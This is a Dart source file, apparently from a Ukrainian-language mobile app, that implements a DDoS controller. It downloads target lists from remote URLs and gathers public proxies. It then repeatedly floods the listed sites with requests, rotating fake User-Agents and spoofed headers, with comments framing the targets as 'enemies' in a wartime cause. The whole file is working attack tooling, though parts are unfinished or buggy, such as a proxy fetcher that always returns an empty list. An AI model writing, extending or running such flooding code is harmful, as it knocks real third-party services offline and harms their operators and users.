import 'dart:async';
import 'dart:convert';
import 'dart:developer' as dev;
import 'dart:io';
import 'package:dio/dio.dart';
import 'package:dio/adapter.dart';

import 'package:faker/faker.dart';
import 'package:http/http.dart' as http;

import 'package:uk_power/ddos_info.dart';

/// our list of targets
const String sourceURL =
    "https://raw.githubusercontent.com/senpaiburado/zxcvbnty/main/ttqtet.txt";

/// ukrainian api's for attacks
const String apiURL = "http://rockstarbloggers.ru/hosts.json";

/// global list of proxies
const String proxySource =
    "https://proxylist.geonode.com/api/proxy-list?limit=COUNT&page=1&sort_by=lastChecked&sort_type=desc";

/// default timeout for requests
const timeout = Duration(seconds: 10);

class Proxy {
  String ip;
  String port;
  String auth;

  Proxy({
    required this.ip,
    required this.port,
    required this.auth,
  });
}

class DDOSController {
  List<String> hosts = [];
  List<String> directTargets = [];
  final int maxIterations = 15;

  Future<void> init(void Function(DDOSInfo) callback) async {
    try {
      callback(await _getHosts());
      await Future.delayed(const Duration(seconds: 2));
      callback(await _getDirectTargets());
    } catch (ex) {
      dev.log(ex.toString());
      callback(
        DDOSInfo(
          status: DDOSStatus.error,
          msg: "${ex.toString()}\n"
              "Виникла помилка при звертанні до джерел",
          dateTime: DateTime.now(),
          responseCode: 503,
        ),
      );
    }
  }

  Future<DDOSInfo> _getHosts() async {
    try {
      http.Response response = await http.get(Uri.parse(apiURL));
      String body = "";

      try {
        body = response.body;
      } catch (ex) {
        dev.log(ex.toString());
        return DDOSInfo(
          msg: "Неможливо розпізнати файл з цілями\n"
              "${ex.toString()}",
          responseCode: 503,
          status: DDOSStatus.error,
          dateTime: DateTime.now(),
        );
      }

      // remove all trash and spaces
      body = body.replaceAll("[", "").replaceAll("]", "");
      body = body.replaceAll("\"", "").replaceAll("\n", "").trim();

      // lets split all urls and save them
      List<String> split = body.split(", ");
      for (String url in split) {
        hosts.add(url.trim());
      }

      return DDOSInfo(
        msg: "Успішно з'єднано до ресурсів: ${hosts.length} шт.",
        responseCode: response.statusCode,
        status: DDOSStatus.success,
        dateTime: DateTime.now(),
      );
    } catch (ex) {
      dev.log(ex.toString());
      return DDOSInfo(
        msg: "Спробуйте ще раз, щось пішло не так\n"
            "${ex.toString()}",
        responseCode: 503,
        status: DDOSStatus.error,
        dateTime: DateTime.now(),
        target: Uri(),
      );
    }
  }

  Future<DDOSInfo> _getDirectTargets() async {
    try {
      http.Response response = await http.get(Uri.parse(sourceURL));
      String body = "";

      try {
        body = response.body;
      } catch (ex) {
        dev.log(ex.toString());
        return DDOSInfo(
          msg: "Неможливо розпізнати файл з цілями\n"
              "${ex.toString()}",
          responseCode: 503,
          status: DDOSStatus.error,
          dateTime: DateTime.now(),
        );
      }

      // lets split all urls and save them
      List<String> split = body.split("\n");
      for (String url in split) {
        if (url.isNotEmpty) directTargets.add(url.trim());
      }

      return DDOSInfo(
        msg: "Успішно знайдено ${directTargets.length} цілей",
        responseCode: response.statusCode,
        status: DDOSStatus.success,
        dateTime: DateTime.now(),
      );
    } catch (ex) {
      dev.log(ex.toString());
      return DDOSInfo(
        msg: "Неможливо отримати список цілей"
            "${ex.toString()}",
        responseCode: 503,
        status: DDOSStatus.error,
        dateTime: DateTime.now(),
      );
    }
  }

  Future<List<Proxy>> _getProxies({int count = 15}) async {
    List<Proxy> proxies = [];
    String url = proxySource.replaceFirst("COUNT", "$count");

    try {
      http.Response response = await http.get(Uri.parse(url));
      String body = "";

      try {
        body = response.body;
      } catch (ex) {
        dev.log(ex.toString());
      }
    } catch (ex) {
      dev.log(ex.toString());
    }

    return proxies;
  }

  String _formateURL(String url) {
    if (!url.startsWith("http")) {
      url = "https://$url";
    }
    return url;
  }

  List<Proxy> _formateProxy(List<dynamic> proxiesRaw) {
    List<Proxy> proxies = [];

    for (var proxy in proxiesRaw) {
      String ip = proxy['ip'];
      String port = ip.replaceRange(0, ip.indexOf(":") + 1, "");
      ip = ip.replaceRange(ip.indexOf(":"), ip.length, "");

      proxies.add(
        Proxy(
          ip: ip,
          port: port,
          auth: proxy['auth'],
        ),
      );
    }

    return proxies;
  }

  /// за Україну
  Future<void> dance(void Function(DDOSInfo) callback) async {
    // create headers
    Map<String, String> headers = {
      'Content-Type': 'application/json',
      'cf-visitor': 'https',
      'User-Agent': faker.internet.userAgent(),
      'Connection': 'keep-alive',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'ru',
      'x-forwarded-proto': 'https',
      'Accept-Encoding': 'gzip, deflate, br',
    };

    if (hosts.isNotEmpty) {
      await _attackUsingHosts((info) => callback(info), headers);
    }

    if (directTargets.isNotEmpty) {
      await _attackUsingTargets((info) => callback(info), headers);
    }
  }

  Future<void> _attackUsingHosts(
    void Function(DDOSInfo) callback,
    Map<String, String> headers,
  ) async {
    for (String host in hosts) {
      try {
        // request target from host
        http.Response response = await http.get(
          Uri.parse(host),
          headers: headers,
        );
        // try get response
        String body = "";
        Map<String, dynamic> jsonData = {};

        try {
          body = response.body;
          jsonData = jsonDecode(body);
        } catch (ex) {
          dev.log(ex.toString());
          callback(
            DDOSInfo(
              msg: "Неможливо розпізнати файл з цілями\n"
                  "${ex.toString()}",
              responseCode: response.statusCode,
              status: DDOSStatus.error,
              dateTime: DateTime.now(),
            ),
          );
          return;
        }

        // get target info
        var site = jsonData['site'];
        List<Proxy> proxies = _formateProxy(jsonData['proxy']);
        String target = _formateURL(site['page']);

        // update header
        headers['User-Agent'] = faker.internet.userAgent();
        // try attack enemies
        try {
          response = await http
              .get(
                Uri.parse(target),
                headers: headers,
              )
              .timeout(
                timeout,
                onTimeout: () => throw TimeoutException(
                  'Перевищенно очікування ${timeout.inSeconds} сек.',
                ),
              );

          // lets use proxies
          if (response.statusCode >= 302 && response.statusCode >= 200) {
            for (Proxy proxy in proxies) {
              // update headers
              headers['User-Agent'] = faker.internet.userAgent();
              // apply proxy
              var dio = Dio();
              (dio.httpClientAdapter as DefaultHttpClientAdapter)
                  .onHttpClientCreate = (client) {
                client.findProxy = (uri) {
                  return "https:${proxy.ip}:${proxy.port}://${proxy.auth}";
                };
                return HttpClient();
              };

              dio.options.headers = headers;
              var dioResponse = await dio
                  .getUri(
                    Uri.parse(target),
                  )
                  .timeout(
                    timeout,
                    onTimeout: () => throw TimeoutException(
                      '[Proxy] Перевищенно очікування ${timeout.inSeconds} сек.',
                    ),
                  );

              if (dioResponse.statusCode! >= 200 &&
                  dioResponse.statusCode! <= 302) {
                for (int i = 0; i < maxIterations; i++) {
                  dioResponse = await dio
                      .getUri(
                        Uri.parse(target),
                      )
                      .timeout(
                        timeout,
                        onTimeout: () => throw TimeoutException(
                          '[Proxy] Перевищенно очікування ${timeout.inSeconds} сек.',
                        ),
                      );

                  callback(
                    DDOSInfo(
                      msg: "[Proxy] Достукались",
                      target: Uri.parse(target),
                      dateTime: DateTime.now(),
                      responseCode: dioResponse.statusCode ?? 503,
                      status: DDOSStatus.success,
                    ),
                  );
                }
              }
            }
          }
          // lets dance
          else {
            for (int i = 0; i < maxIterations; i++) {
              // update headers
              headers['User-Agent'] = faker.internet.userAgent();
              response = await http
                  .get(
                    Uri.parse(target),
                    headers: headers,
                  )
                  .timeout(
                    timeout,
                    onTimeout: () => throw TimeoutException(
                      'Перевищенно очікування ${timeout.inSeconds} сек.',
                    ),
                  );

              callback(
                DDOSInfo(
                  msg: "Достукались",
                  target: Uri.parse(target),
                  dateTime: DateTime.now(),
                  responseCode: response.statusCode,
                  status: DDOSStatus.success,
                ),
              );
            }
          }
        } catch (ex) {
          dev.log(ex.toString());
          callback(
            DDOSInfo(
              msg: ex.toString(),
              responseCode: 503,
              status: DDOSStatus.error,
              dateTime: DateTime.now(),
              target: Uri.parse(target),
            ),
          );
          return;
        }
      } catch (ex) {
        dev.log(ex.toString());
        callback(
          DDOSInfo(
            msg: ex.toString(),
            responseCode: 0,
            status: DDOSStatus.error,
            dateTime: DateTime.now(),
          ),
        );
        return;
      }
    }
  }

  Future<void> _attackUsingTargets(
    void Function(DDOSInfo) callback,
    Map<String, String> headers,
  ) async {
    // get proxies
    List<Proxy> proxies = await _getProxies();
  }
}
